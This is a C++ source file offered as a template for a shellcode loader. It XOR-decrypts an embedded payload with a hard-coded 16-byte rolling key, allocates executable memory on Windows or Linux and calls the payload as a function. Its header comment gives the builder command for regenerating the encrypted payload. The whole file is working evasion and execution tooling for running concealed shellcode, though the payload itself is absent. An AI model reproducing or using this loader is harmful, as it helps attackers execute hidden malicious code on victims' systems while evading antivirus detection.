/*
 * xor_loader.cpp - rolling multi-byte XOR shellcode loader template
 * =================================================================
 * Decrypts an embedded XOR blob (rolling key, length-preserving) and
 * executes it as a function.
 *
 * Build-time parameters (see payloads/xor_300b.meta.json):
 *   key : a1b2c3d4e5f60718293a4b5c6d7e8f90 (16 B)
 *
 * Regenerate the payload include with the builder:
 *   shellcrypt.py -i shellcode.bin -m xor --key-hex -k a1b2...8f90 \
 *       --verify --meta params.json -f c -o payload_inc.h
 *
 * Compile: g++ -O2 -Wall -o xor_loader xor_loader.cpp
 */
#include <cstdint>
#include <cstdio>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

#include "payload_inc.h" /* kEncrypted[], kEncryptedLen, kOriginalLen */

static const uint8_t kKey[16] = {
    0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x07, 0x18,
    0x29, 0x3a, 0x4b, 0x5c, 0x6d, 0x7e, 0x8f, 0x90
};

/* Rolling XOR: byte i is XORed with key[i % keylen]. Length-preserving. */
static void xor_decrypt(const uint8_t *ct, uint8_t *pt, size_t len) {
    for (size_t i = 0; i < len; i++)
        pt[i] = ct[i] ^ kKey[i % sizeof(kKey)];
}

static int run_payload(const uint8_t *p, size_t n) {
#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) { printf("[-] VirtualAlloc failed\n"); return -1; }
#else
    void *mem = mmap(NULL, n, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) { printf("[-] mmap failed\n"); return -1; }
#endif
    memcpy(mem, p, n);
    int (*fn)() = (int (*)())mem;
    int r = fn();
#ifdef _WIN32
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    munmap(mem, n);
#endif
    return r;
}

int main(void) {
    static uint8_t plain[4096];
    xor_decrypt(kEncrypted, plain, kEncryptedLen);
    printf("[+] XOR decrypted %u bytes\n", kEncryptedLen);
    int r = run_payload(plain, kEncryptedLen);
    printf("[+] payload returned %d\n", r);
    return 0;
}
